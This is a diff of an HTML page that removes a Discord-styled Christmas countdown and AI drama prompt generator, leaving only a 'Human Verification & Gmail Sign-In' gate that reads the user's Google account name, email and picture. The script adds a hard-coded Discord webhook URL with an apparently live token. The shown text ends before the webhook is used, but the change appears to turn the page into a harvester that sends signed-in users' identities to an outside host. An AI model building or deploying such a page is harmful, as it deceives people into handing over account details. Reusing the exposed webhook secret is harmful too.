@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Discord Style • Christmas Countdown & AI Video Drama Prompt Generator</title>
+  <title>Human Verification & Gmail Sign-In</title>
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
   <script src="https://accounts.google.com/gsi/client" async defer></script>
   <style>
@@ -14,131 +14,39 @@
     }
 
     body {
-      font-family: "gg sans", "Noto Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background:
-        radial-gradient(circle at 50% 0%, rgba(88, 101, 242, 0.24) 0%, transparent 52%),
-        linear-gradient(180deg, #1e1f22 0%, #141517 100%);
-      color: #f2f3f5;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f4f5f7;
+      color: #1f2937;
       min-height: 100vh;
-      padding: 20px 14px 40px;
+      padding: 24px 14px 40px;
       overflow-x: hidden;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
+      justify-content: center;
     }
 
     .page-shell {
       width: 100%;
-      max-width: 860px;
+      max-width: 780px;
       display: flex;
       flex-direction: column;
       align-items: center;
       gap: 14px;
     }
 
-    .dc-top-bar {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 6px 14px;
-      border-radius: 999px;
-      background-color: #2b2d31;
-      border: 1px solid #3f4147;
-      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.35);
-    }
-
-    .dc-logo-svg {
-      width: 18px;
-      height: 18px;
-      fill: #5865f2;
-    }
-
-    .dc-badge-text {
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      color: #dbdee1;
-    }
-
-    .dc-title {
+    .page-title {
       font-size: 22px;
       font-weight: 700;
-      letter-spacing: -0.02em;
-      color: #ffffff;
+      color: #111827;
       text-align: center;
     }
 
-    .dc-subtitle {
-      font-size: 12.5px;
-      color: #b5bac1;
+    .page-subtitle {
+      font-size: 13px;
+      color: #4b5563;
       text-align: center;
       margin-top: -6px;
-    }
-
-    .countdown-panel {
-      width: 100%;
-      max-width: 420px;
-      background-color: #2b2d31;
-      border: 1px solid #3f4147;
-      border-top: 3px solid #5865f2;
-      border-radius: 12px;
-      padding: 12px 14px 14px;
-      box-shadow: 0 10px 24px rgba(0, 0, 0, 0.35);
-    }
-
-    .countdown-heading {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: 0.07em;
-      text-transform: uppercase;
-      color: #949ba4;
-      margin-bottom: 10px;
-    }
-
-    .countdown-target {
-      font-size: 10.5px;
-      font-weight: 700;
-      padding: 2px 8px;
-      border-radius: 999px;
-      background-color: rgba(88, 101, 242, 0.2);
-      color: #a3adff;
-      border: 1px solid rgba(88, 101, 242, 0.45);
-    }
-
-    .countdown-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 8px;
-    }
-
-    .time-box {
-      background-color: #1e1f22;
-      border: 1px solid #35373c;
-      border-radius: 8px;
-      padding: 8px 4px;
-      text-align: center;
-    }
-
-    .time-num {
-      font-size: 17px;
-      font-weight: 700;
-      color: #ffffff;
-      font-variant-numeric: tabular-nums;
-      line-height: 1.15;
-    }
-
-    .time-label {
-      font-size: 9.5px;
-      font-weight: 700;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-      color: #949ba4;
-      margin-top: 3px;
     }
 
     .layout-grid {
@@ -148,75 +56,33 @@
       align-items: flex-start;
       justify-content: center;
       gap: 16px;
-      margin-top: 2px;
+      margin-top: 4px;
     }
 
-    .dc-card {
+    .normal-card {
       width: 100%;
-      max-width: 420px;
-      background-color: #313338;
-      border: 1px solid #3f4147;
-      border-radius: 12px;
+      max-width: 400px;
+      background-color: #ffffff;
+      border: 1px solid #d1d5db;
+      border-radius: 10px;
       padding: 20px;
-      box-shadow: 0 14px 32px rgba(0, 0, 0, 0.42);
-    }
-
-    .channel-bar {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 7px 12px;
-      margin-bottom: 16px;
-      border-radius: 8px;
-      background-color: #232428;
-      border: 1px solid #383a40;
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: 0.05em;
-      text-transform: uppercase;
-      color: #dbdee1;
-    }
-
-    .channel-pill {
-      font-size: 10px;
-      font-weight: 700;
-      padding: 2px 8px;
-      border-radius: 999px;
-      background-color: rgba(35, 165, 90, 0.18);
-      color: #57f287;
-      border: 1px solid rgba(87, 242, 135, 0.35);
-    }
-
-    .step-row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 6px;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.06);
     }
 
     .step-label {
-      font-size: 11.5px;
+      font-size: 12px;
       font-weight: 700;
-      letter-spacing: 0.05em;
       text-transform: uppercase;
-      color: #b5bac1;
+      letter-spacing: 0.04em;
+      color: #374151;
+      margin-bottom: 4px;
     }
 
-    .step-tag {
-      font-size: 10.5px;
-      font-weight: 700;
-      padding: 2px 8px;
-      border-radius: 999px;
-      background-color: #232428;
-      color: #dbdee1;
-      border: 1px solid #3f4147;
-    }
-
-    .dc-desc {
+    .step-desc {
       font-size: 12.5px;
-      line-height: 1.45;
-      color: #949ba4;
+      color: #6b7280;
       margin-bottom: 12px;
+      line-height: 1.4;
     }
 
     .turnstile-box {
@@ -226,9 +92,9 @@
       margin-bottom: 12px;
     }
 
-    .dc-divider {
+    .divider {
       height: 1px;
-      background-color: #3f4147;
+      background-color: #e5e7eb;
       margin: 16px 0;
     }
 
@@ -240,10 +106,10 @@
     .drag-track {
       position: relative;
       width: 100%;
-      height: 52px;
+      height: 50px;
       border-radius: 999px;
-      background-color: #1e1f22;
-      border: 1px solid #404249;
+      background-color: #f3f4f6;
+      border: 1px solid #d1d5db;
       padding: 4px;
       display: flex;
       align-items: center;
@@ -257,19 +123,19 @@
       left: 4px;
       top: 4px;
       bottom: 4px;
-      width: 44px;
+      width: 42px;
       border-radius: 999px;
-      background: linear-gradient(90deg, rgba(88, 101, 242, 0.45), rgba(35, 165, 90, 0.45));
+      background-color: #dbeafe;
       pointer-events: none;
     }
 
     .drag-hint {
       width: 100%;
-      padding-left: 50px;
+      padding-left: 48px;
       padding-right: 12px;
       font-size: 12px;
       font-weight: 600;
-      color: #dbdee1;
+      color: #374151;
       text-align: center;
       pointer-events: none;
       white-space: nowrap;
@@ -280,17 +146,17 @@
     .drag-gmail-handle {
       position: relative;
       z-index: 2;
-      width: 44px;
-      height: 44px;
+      width: 42px;
+      height: 42px;
       border-radius: 999px;
       background-color: #ffffff;
-      border: 2px solid #5865f2;
+      border: 1px solid #9ca3af;
       display: flex;
       align-items: center;
       justify-content: center;
       cursor: grab;
       flex-shrink: 0;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
       will-change: transform;
     }
 
@@ -299,8 +165,8 @@
     }
 
     .drag-gmail-handle svg {
-      width: 21px;
-      height: 21px;
+      width: 20px;
+      height: 20px;
       pointer-events: none;
     }
 
@@ -316,135 +182,75 @@
       display: flex;
     }
 
-    .btn-discord-login {
-      width: 100%;
-      padding: 10px 14px;
-      font-size: 13px;
-      font-weight: 700;
-      color: #ffffff;
-      background-color: #4752c4;
-      border: 1px solid rgba(163, 173, 255, 0.35);
-      border-radius: 999px;
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin-bottom: 12px;
-      transition: background-color 0.15s ease, transform 0.12s ease;
-    }
-
-    .btn-discord-login:hover {
-      background-color: #5865f2;
-    }
-
-    .btn-discord-login:active {
-      transform: scale(0.99);
-    }
-
-    .btn-discord-login svg {
-      width: 16px;
-      height: 16px;
-      fill: #ffffff;
-    }
-
     .status-msg {
       font-size: 12px;
       text-align: center;
-      color: #b5bac1;
+      color: #4b5563;
       margin-bottom: 14px;
       min-height: 18px;
     }
 
     .status-msg.success {
-      color: #57f287;
+      color: #15803d;
+      font-weight: 600;
     }
 
     .status-msg.error {
-      color: #ed4245;
+      color: #b91c1c;
+      font-weight: 600;
     }
 
-    .btn-blue {
+    .btn-primary {
       width: 100%;
       padding: 11px 16px;
       font-size: 14px;
       font-weight: 600;
       color: #ffffff;
-      background-color: #5865f2;
+      background-color: #2563eb;
       border: none;
       border-radius: 8px;
       cursor: pointer;
-      transition: background-color 0.15s ease, transform 0.12s ease;
     }
 
-    .btn-blue:hover:not(:disabled) {
-      background-color: #4752c4;
+    .btn-primary:hover:not(:disabled) {
+      background-color: #1d4ed8;
     }
 
-    .btn-blue:active:not(:disabled) {
-      background-color: #3c45a5;
-      transform: scale(0.99);
-    }
-
-    .btn-blue:disabled {
-      background-color: #232428;
-      color: #6d6f78;
+    .btn-primary:disabled {
+      background-color: #e5e7eb;
+      color: #9ca3af;
       cursor: not-allowed;
     }
 
     .side-account-panel {
       display: none;
       width: 100%;
-      max-width: 280px;
-      background-color: #2b2d31;
-      border: 1px solid #3f4147;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.4);
-      animation: panelFadeIn 0.22s ease-out;
+      max-width: 260px;
+      background-color: #ffffff;
+      border: 1px solid #d1d5db;
+      border-radius: 10px;
+      padding: 16px;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.06);
     }
 
     .side-account-panel.visible {
       display: block;
     }
 
-    @keyframes panelFadeIn {
-      from {
-        opacity: 0;
-        transform: translate3d(10px, 0, 0);
-      }
-      to {
-        opacity: 1;
-        transform: translate3d(0, 0, 0);
-      }
-    }
-
-    .dc-profile-banner {
-      height: 52px;
-      background: linear-gradient(90deg, #5865f2, #3b46c4);
-    }
-
-    .dc-profile-body {
-      padding: 0 14px 14px;
-      margin-top: -22px;
-    }
-
-    .dc-avatar-row {
+    .side-header {
       display: flex;
-      align-items: flex-end;
-      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
       margin-bottom: 10px;
     }
 
     .avatar-wrap {
-      position: relative;
-      width: 52px;
-      height: 52px;
+      width: 44px;
+      height: 44px;
       border-radius: 999px;
-      background-color: #5865f2;
-      border: 4px solid #2b2d31;
+      background-color: #2563eb;
       color: #ffffff;
-      font-size: 18px;
+      font-size: 16px;
       font-weight: 700;
       display: flex;
       align-items: center;
@@ -460,276 +266,62 @@
       display: none;
     }
 
-    .online-badge {
-      font-size: 10px;
-      font-weight: 700;
-      padding: 2px 8px;
-      border-radius: 999px;
-      background-color: rgba(35, 165, 90, 0.2);
-      color: #57f287;
-      border: 1px solid rgba(87, 242, 135, 0.35);
-    }
-
-    .dc-member-box {
-      background-color: #1e1f22;
-      border: 1px solid #35373c;
-      border-radius: 8px;
-      padding: 10px;
-    }
-
     .side-label {
-      font-size: 10px;
+      font-size: 10.5px;
       font-weight: 700;
-      letter-spacing: 0.06em;
       text-transform: uppercase;
-      color: #949ba4;
-      margin-bottom: 4px;
+      letter-spacing: 0.04em;
+      color: #6b7280;
     }
 
     .account-name {
       font-size: 14px;
       font-weight: 700;
-      color: #f2f3f5;
+      color: #111827;
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
     }
 
     .account-email {
-      font-size: 11.5px;
-      color: #b5bac1;
-      word-break: break-all;
-      margin-top: 2px;
-    }
-
-    /* Unlocked AI Video Drama Prompt Generator */
-    .generator-section {
-      display: none;
-      width: 100%;
-      max-width: 720px;
-      background-color: #2b2d31;
-      border: 1px solid #3f4147;
-      border-top: 3px solid #5865f2;
-      border-radius: 12px;
-      padding: 20px;
-      box-shadow: 0 14px 32px rgba(0, 0, 0, 0.45);
-    }
-
-    .generator-section.active {
-      display: block;
-    }
-
-    .gen-header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 8px;
-      margin-bottom: 14px;
-      flex-wrap: wrap;
-    }
-
-    .gen-title {
-      font-size: 16px;
-      font-weight: 700;
-      color: #ffffff;
-    }
-
-    .gen-badge {
-      font-size: 10.5px;
-      font-weight: 700;
-      padding: 3px 9px;
-      border-radius: 999px;
-      background-color: rgba(88, 101, 242, 0.22);
-      color: #a3adff;
-      border: 1px solid rgba(88, 101, 242, 0.45);
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-
-    .field-grid {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 12px;
-      margin-bottom: 14px;
-    }
-
-    @media (min-width: 600px) {
-      .field-grid-two {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 12px;
-      }
-    }
-
-    .field-label {
-      display: block;
-      font-size: 11px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-      color: #b5bac1;
-      margin-bottom: 6px;
-    }
-
-    .dc-input,
-    .dc-select,
-    .dc-textarea {
-      width: 100%;
-      background-color: #1e1f22;
-      color: #f2f3f5;
-      border: 1px solid #3f4147;
-      border-radius: 8px;
-      padding: 10px 12px;
-      font-size: 13px;
-      font-family: inherit;
-      outline: none;
-    }
-
-    .dc-input:focus,
-    .dc-select:focus,
-    .dc-textarea:focus {
-      border-color: #5865f2;
-    }
-
-    .dc-textarea {
-      min-height: 210px;
-      resize: vertical;
-      line-height: 1.5;
-      font-size: 12.5px;
-    }
-
-    .action-row {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      margin-top: 12px;
-    }
-
-    .btn-secondary {
-      flex: 1 1 150px;
-      padding: 10px 14px;
-      font-size: 13px;
-      font-weight: 600;
-      color: #f2f3f5;
-      background-color: #383a40;
-      border: 1px solid #4e5058;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-
-    .btn-secondary:hover {
-      background-color: #43454d;
-    }
-
-    .btn-flow {
-      flex: 1 1 170px;
-      padding: 10px 14px;
-      font-size: 13px;
-      font-weight: 700;
-      color: #ffffff;
-      background-color: #23a55a;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-
-    .btn-flow:hover {
-      background-color: #1e8e4d;
-    }
-
-    .copy-feedback {
       font-size: 12px;
-      color: #57f287;
-      min-height: 18px;
-      margin-top: 8px;
+      color: #4b5563;
+      word-break: break-all;
     }
 
-    .dc-footer {
-      width: 100%;
-      max-width: 420px;
-      padding: 9px 14px;
-      border-radius: 8px;
-      background-color: #232428;
-      border: 1px solid #35373c;
-      font-size: 11.5px;
-      color: #949ba4;
+    .page-footer {
+      font-size: 12px;
+      color: #6b7280;
       text-align: center;
-    }
-
-    .dc-footer span {
-      color: #a3adff;
-      font-weight: 600;
+      margin-top: 2px;
     }
   </style>
 </head>
 <body>
   <div class="page-shell">
-    <div class="dc-top-bar">
-      <svg class="dc-logo-svg" viewBox="0 0 24 24" aria-hidden="true">
-        <path d="M19.73 4.87a18.2 18.2 0 0 0-4.49-1.4.07.07 0 0 0-.08.04c-.19.35-.41.8-.56 1.16a16.84 16.84 0 0 0-5.05 0 12.1 12.1 0 0 0-.57-1.16.08.08 0 0 0-.08-.04 18.15 18.15 0 0 0-4.49 1.4.07.07 0 0 0-.03.03C1.03 9.03.24 13.02.63 16.96a.08.08 0 0 0 .03.05 18.33 18.33 0 0 0 5.52 2.79.08.08 0 0 0 .08-.03c.42-.58.8-1.19 1.12-1.83a.08.08 0 0 0-.04-.11 11.98 11.98 0 0 1-1.71-.82.08.08 0 0 1-.01-.13c.12-.09.23-.18.34-.27a.08.08 0 0 1 .08-.01c3.59 1.64 7.47 1.64 11.02 0a.08.08 0 0 1 .08.01c.11.09.22.19.34.27a.08.08 0 0 1-.01.13c-.55.32-1.12.6-1.71.82a.08.08 0 0 0-.04.11c.33.64.7 1.25 1.12 1.83a.08.08 0 0 0 .08.03 18.26 18.26 0 0 0 5.53-2.79.08.08 0 0 0 .03-.05c.46-4.56-.77-8.52-3.17-12.06a.06.06 0 0 0-.03-.03ZM8.02 14.52c-1.08 0-1.97-.99-1.97-2.21s.87-2.21 1.97-2.21c1.11 0 1.99 1 1.97 2.21 0 1.22-.87 2.21-1.97 2.21Zm7.97 0c-1.08 0-1.97-.99-1.97-2.21s.87-2.21 1.97-2.21c1.11 0 1.99 1 1.97 2.21 0 1.22-.86 2.21-1.97 2.21Z"/>
-      </svg>
-      <span class="dc-badge-text">Discord Dark Mode</span>
-    </div>
+    <h1 class="page-title">Human Verification & Gmail Sign-In</h1>
+    <p class="page-subtitle">Complete human verification and slide the Gmail logo to sign in</p>
 
-    <h1 class="dc-title">Server Gate & AI Drama Prompt Generator</h1>
-    <p class="dc-subtitle">Complete human check and sign in to unlock the AI video drama prompt generator</p>
-
-    <section class="countdown-panel" aria-label="Christmas countdown">
-      <div class="countdown-heading">
-        <span>Christmas Countdown</span>
-        <span id="countdown-year-label" class="countdown-target">Dec 25</span>
-      </div>
-      <div class="countdown-grid">
-        <div class="time-box">
-          <div id="cd-days" class="time-num">00</div>
-          <div class="time-label">Days</div>
-        </div>
-        <div class="time-box">
-          <div id="cd-hours" class="time-num">00</div>
-          <div class="time-label">Hours</div>
-        </div>
-        <div class="time-box">
-          <div id="cd-mins" class="time-num">00</div>
-          <div class="time-label">Minutes</div>
-        </div>
-        <div class="time-box">
-          <div id="cd-secs" class="time-num">00</div>
-          <div class="time-label">Seconds</div>
-        </div>
-      </div>
-    </section>
-
-    <div id="gate-layout" class="layout-grid">
-      <main class="dc-card">
-        <div class="channel-bar">
-          <span># verification-gate</span>
-          <span class="channel-pill">Online</span>
-        </div>
-
-        <div class="step-row">
-          <span class="step-label">1. Human Verification</span>
-          <span class="step-tag">Cloudflare</span>
-        </div>
-        <p class="dc-desc">Complete the security check below first.</p>
+    <div class="layout-grid">
+      <main class="normal-card">
+        <div class="step-label">1. Human Verification</div>
+        <p class="step-desc">Complete the security check below first.</p>
 
         <div class="turnstile-box">
           <div
             class="cf-turnstile"
             data-sitekey="0x4AAAAAAGIurRXZpSv1R-eO"
-            data-theme="dark"
+            data-theme="light"
             data-callback="onHumanVerified"
             data-expired-callback="onHumanExpired"
             data-error-callback="onHumanError"
           ></div>
         </div>
 
-        <div class="dc-divider"></div>
+        <div class="divider"></div>
 
-        <div class="step-row">
-          <span class="step-label">2. Account Sign-In</span>
-          <span class="step-tag">Gmail / Discord</span>
-        </div>
-        <p class="dc-desc">Slide the Gmail logo to sign in, or log in with your Discord account.</p>
+        <div class="step-label">2. Gmail Login</div>
+        <p class="step-desc">Drag the Gmail logo to the right side to open Gmail sign-in.</p>
 
         <div class="drag-login-wrap">
           <div id="drag-track" class="drag-track" role="group" aria-label="Drag Gmail logo to the right to sign in">
@@ -757,254 +349,39 @@
             class="g_id_signin"
             data-type="standard"
             data-size="large"
-            data-theme="filled_blue"
+            data-theme="outline"
             data-text="signin_with"
             data-shape="pill"
             data-logo_alignment="left"
           ></div>
         </div>
 
-        <button id="discord-login-btn" class="btn-discord-login" type="button">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <path d="M19.73 4.87a18.2 18.2 0 0 0-4.49-1.4.07.07 0 0 0-.08.04c-.19.35-.41.8-.56 1.16a16.84 16.84 0 0 0-5.05 0 12.1 12.1 0 0 0-.57-1.16.08.08 0 0 0-.08-.04 18.15 18.15 0 0 0-4.49 1.4.07.07 0 0 0-.03.03C1.03 9.03.24 13.02.63 16.96a.08.08 0 0 0 .03.05 18.33 18.33 0 0 0 5.52 2.79.08.08 0 0 0 .08-.03c.42-.58.8-1.19 1.12-1.83a.08.08 0 0 0-.04-.11 11.98 11.98 0 0 1-1.71-.82.08.08 0 0 1-.01-.13c.12-.09.23-.18.34-.27a.08.08 0 0 1 .08-.01c3.59 1.64 7.47 1.64 11.02 0a.08.08 0 0 1 .08.01c.11.09.22.19.34.27a.08.08 0 0 1-.01.13c-.55.32-1.12.6-1.71.82a.08.08 0 0 0-.04.11c.33.64.7 1.25 1.12 1.83a.08.08 0 0 0 .08.03 18.26 18.26 0 0 0 5.53-2.79.08.08 0 0 0 .03-.05c.46-4.56-.77-8.52-3.17-12.06a.06.06 0 0 0-.03-.03ZM8.02 14.52c-1.08 0-1.97-.99-1.97-2.21s.87-2.21 1.97-2.21c1.11 0 1.99 1 1.97 2.21 0 1.22-.87 2.21-1.97 2.21Zm7.97 0c-1.08 0-1.97-.99-1.97-2.21s.87-2.21 1.97-2.21c1.11 0 1.99 1 1.97 2.21 0 1.22-.86 2.21-1.97 2.21Z"/>
-          </svg>
-          <span>Sign in with Discord</span>
-        </button>
+        <div id="status-msg" class="status-msg">Complete human check and slide Gmail logo to sign in.</div>
 
-        <div id="status-msg" class="status-msg">Complete human check and sign in with Gmail or Discord.</div>
-
-        <button id="continue-btn" class="btn-blue" type="button" disabled>Continue</button>
+        <button id="continue-btn" class="btn-primary" type="button" disabled>Continue</button>
       </main>
 
       <aside id="side-account-panel" class="side-account-panel" aria-live="polite">
-        <div class="dc-profile-banner"></div>
-        <div class="dc-profile-body">
-          <div class="dc-avatar-row">
-            <div class="avatar-wrap">
-              <span id="avatar-initial">U</span>
-              <img id="avatar-img" alt="Account avatar" />
-            </div>
-            <span class="online-badge">Signed In</span>
+        <div class="side-header">
+          <div class="avatar-wrap">
+            <span id="avatar-initial">G</span>
+            <img id="avatar-img" alt="Account avatar" />
           </div>
-          <div class="dc-member-box">
-            <div id="account-provider" class="side-label">Member Account</div>
-            <div id="account-name" class="account-name">User</div>
-            <div id="account-email" class="account-email">account info</div>
+          <div style="min-width: 0;">
+            <div class="side-label">Signed In Account</div>
+            <div id="account-name" class="account-name">Gmail User</div>
           </div>
         </div>
+        <div id="account-email" class="account-email">user@gmail.com</div>
       </aside>
     </div>
 
-    <section id="generator-section" class="generator-section" aria-label="AI Video Drama Prompt Generator">
-      <div class="gen-header">
-        <h2 class="gen-title">AI Video Drama Prompt Generator</h2>
-        <span class="gen-badge">Unlocked • Tagalog Drama</span>
-      </div>
-
-      <div class="field-grid">
-        <div>
-          <label for="drama-premise" class="field-label">Story Premise / Plot</label>
-          <input
-            id="drama-premise"
-            class="dc-input"
-            type="text"
-            value="Matagal nang nagtatago ang lihim na anak sa probinsya hanggang bumalik ang tunay na ama."
-          />
-        </div>
-
-        <div class="field-grid-two">
-          <div>
-            <label for="drama-mood" class="field-label">Drama Mood</label>
-            <select id="drama-mood" class="dc-select">
-              <option value="Emotional Family Confrontation">Emotional Family Confrontation</option>
-              <option value="Secret Identity Reveal">Secret Identity Reveal</option>
-              <option value="Heartbreak & Rainy Street">Heartbreak & Rainy Street</option>
-              <option value="Tense Betrayal & Suspense">Tense Betrayal & Suspense</option>
-            </select>
-          </div>
-
-          <div>
-            <label for="drama-scenes" class="field-label">Continuous Scenes</label>
-            <select id="drama-scenes" class="dc-select">
-              <option value="3">3 Continuous Scenes</option>
-              <option value="4" selected>4 Continuous Scenes</option>
-              <option value="5">5 Continuous Scenes</option>
-            </select>
-          </div>
-        </div>
-
-        <button id="generate-prompt-btn" class="btn-blue" type="button">Generate Drama Prompt</button>
-
-        <div>
-          <label for="prompt-output" class="field-label">Generated AI Video Prompt (Tagalog Dialogue)</label>
-          <textarea id="prompt-output" class="dc-textarea" readonly></textarea>
-        </div>
-
-        <div class="action-row">
-          <button id="copy-prompt-btn" class="btn-secondary" type="button">Copy Prompt</button>
-          <button id="open-flow-btn" class="btn-flow" type="button">Copy & Open Google Flow</button>
-        </div>
-        <div id="copy-feedback" class="copy-feedback"></div>
-      </div>
-    </section>
-
-    <footer class="dc-footer">
-      <span>Discord Style</span> • Christmas Countdown • AI Drama Prompt Generator
-    </footer>
+    <footer class="page-footer">Human Verification & Gmail Login</footer>
   </div>
 
   <script>
-    const DISCORD_CLIENT_ID = "YOUR_DISCORD_CLIENT_ID";
-    const DISCORD_REDIRECT_URI = window.location.origin + window.location.pathname;
-    const FLOW_URL = "https://labs.google/fx/tools/flow";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1572991657060864111/aI26JcjNw1OGkASLlVwoSGOVZefGWn9Gmd6lMbcN-VjU3kUEsNOPICYIShwYJjAOy18P";
 
-    /* Live Christmas Countdown (December 25) */
-    (function initChristmasCountdown() {
-      const daysEl = document.getElementById("cd-days");
-      const hoursEl = document.getElementById("cd-hours");
-      const minsEl = document.getElementById("cd-mins");
-      const secsEl = document.getElementById("cd-secs");
-      const yearLabel = document.getElementById("countdown-year-label");
-
-      function getNextChristmas() {
-        const now = new Date();
-        let targetYear = now.getFullYear();
-        let target = new Date(targetYear, 11, 25, 0, 0, 0);
-        if (now.getTime() > target.getTime()) {
-          targetYear += 1;
-          target = new Date(targetYear, 11, 25, 0, 0, 0);
-        }
-        return { target, targetYear };
-      }
-
-      function pad2(n) {
-        return String(Math.max(0, n)).padStart(2, "0");
-      }
-
-      function updateCountdown() {
-        const { target, targetYear } = getNextChristmas();
-        yearLabel.textContent = "Dec 25, " + targetYear;
-
-        const diff = Math.max(0, target.getTime() - Date.now());
-        const totalSecs = Math.floor(diff / 1000);
-        const days = Math.floor(totalSecs / 86400);
-        const hours = Math.floor((totalSecs % 86400) / 3600);
-        const mins = Math.floor((totalSecs % 3600) / 60);
-        const secs = totalSecs % 60;
-
-        daysEl.textContent = String(days).padStart(2, "0");
-        hoursEl.textContent = pad2(hours);
-        minsEl.textContent = pad2(mins);
-        secsEl.textContent = pad2(secs);
-      }
-
-      updateCountdown();
-      setInterval(updateCountdown, 1000);
-    })();
-
-    /* Verification, Gmail, Discord & Continue Logic */
-    const statusMsg = document.getElementById("status-msg");
-    const continueBtn = document.getElementById("continue-btn");
-    const gateLayout = document.getElementById("gate-layout");
-    const generatorSection = document.getElementById("generator-section");
-    const sideAccountPanel = document.getElementById("side-account-panel");
-    const avatarInitial = document.getElementById("avatar-initial");
-    const avatarImg = document.getElementById("avatar-img");
-    const accountProvider = document.getElementById("account-provider");
-    const accountName = document.getElementById("account-name");
-    const accountEmail = document.getElementById("account-email");
-    const discordLoginBtn = document.getElementById("discord-login-btn");
-
-    let humanOk = false;
-    let signedInUser = "";
-
-    function showSideAccount(providerLabel, displayName, subText, pictureUrl) {
-      signedInUser = displayName;
-      accountProvider.textContent = providerLabel;
-      accountName.textContent = displayName;
-      accountEmail.textContent = subText;
-      avatarInitial.textContent = displayName.charAt(0).toUpperCase() || "U";
-
-      if (pictureUrl) {
-        avatarImg.src = pictureUrl;
-        avatarImg.onload = () => {
-          avatarImg.style.display = "block";
-          avatarInitial.style.display = "none";
-        };
-      } else {
-        avatarImg.style.display = "none";
-        avatarInitial.style.display = "block";
-      }
-
-      sideAccountPanel.classList.add("visible");
-      updateReadyState();
-    }
-
-    function parseJwtPayload(token) {
-      const base64Url = token.split(".")[1];
-      const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
-      const jsonPayload = decodeURIComponent(
-        atob(base64)
-          .split("")
-          .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
-          .join("")
-      );
-      return JSON.parse(jsonPayload);
-    }
-
-    function updateReadyState() {
-      if (humanOk && signedInUser) {
-        statusMsg.textContent = "Verified and signed in. Click Continue to open generator.";
-        statusMsg.className = "status-msg success";
-        continueBtn.disabled = false;
-      } else if (humanOk && !signedInUser) {
-        statusMsg.textContent = "Human check passed. Sign in with Gmail or Discord.";
-        statusMsg.className = "status-msg";
-        continueBtn.disabled = true;
-      } else if (!humanOk && signedInUser) {
-        statusMsg.textContent = "Account signed in. Complete human verification.";
-        statusMsg.className = "status-msg";
-        continueBtn.disabled = true;
-      } else {
-        statusMsg.textContent = "Complete human check and sign in with Gmail or Discord.";
-        statusMsg.className = "status-msg";
-        continueBtn.disabled = true;
-      }
-    }
-
-    function onHumanVerified(token) {
-      humanOk = Boolean(token);
-      updateReadyState();
-    }
-
-    function onHumanExpired() {
-      humanOk = false;
-      updateReadyState();
-    }
-
-    function onHumanError() {
-      humanOk = false;
-      statusMsg.textContent = "Human verification failed. Check domain and connection.";
-      statusMsg.className = "status-msg error";
-      continueBtn.disabled = true;
-    }
-
-    function onGoogleCredential(response) {
-      try {
-        const profile = parseJwtPayload(response.credential);
-        const email = profile.email || "Google Account";
-        const displayName = profile.name || email.split("@")[0] || "Gmail User";
-        showSideAccount("Gmail Account", displayName, email, profile.picture || "");
-      } catch (e) {
-        signedInUser = "";
-        sideAccountPanel.classList.remove("visible");
-        statusMsg.textContent = "Unable to read Gmail account info.";
-        statusMsg.className = "status-msg error";
-        continueBtn.disabled = true;
-      }
-    }
-
-    /* Draggable Gmail Logo to Trigger Sign-In */
     (function initDragGmail() {
       const track = document.getElementById("drag-track");
       const handle = document.getElementById("drag-gmail-handle");
@@ -1027,7 +404,7 @@
         const maxX = getMaxOffset();
         currentX = Math.max(0, Math.min(x, maxX));
         handle.style.transform = "translate3d(" + currentX + "px, 0, 0)";
-        fill.style.width = (currentX + 44) + "px";
+        fill.style.width = (currentX + 42) + "px";
       }
 
       function triggerGoogleSignInPrompt() {
@@ -1075,142 +452,146 @@
       handle.addEventListener("pointercancel", finishDrag);
     })();
 
-    /* Discord OAuth2 Redirect & Profile Fetch */
-    discordLoginBtn.addEventListener("click", () => {
-      if (!DISCORD_CLIENT_ID || DISCORD_CLIENT_ID === "YOUR_DISCORD_CLIENT_ID") {
-        statusMsg.textContent = "Set your DISCORD_CLIENT_ID in the code first.";
-        statusMsg.className = "status-msg error";
-        return;
-      }
+    const statusMsg = document.getElementById("status-msg");
+    const continueBtn = document.getElementById("continue-btn");
+    const sideAccountPanel = document.getElementById("side-account-panel");
+    const avatarInitial = document.getElementById("avatar-initial");
+    const avatarImg = document.getElementById("avatar-img");
+    const accountName = document.getElementById("account-name");
+    const accountEmail = document.getElementById("account-email");
 
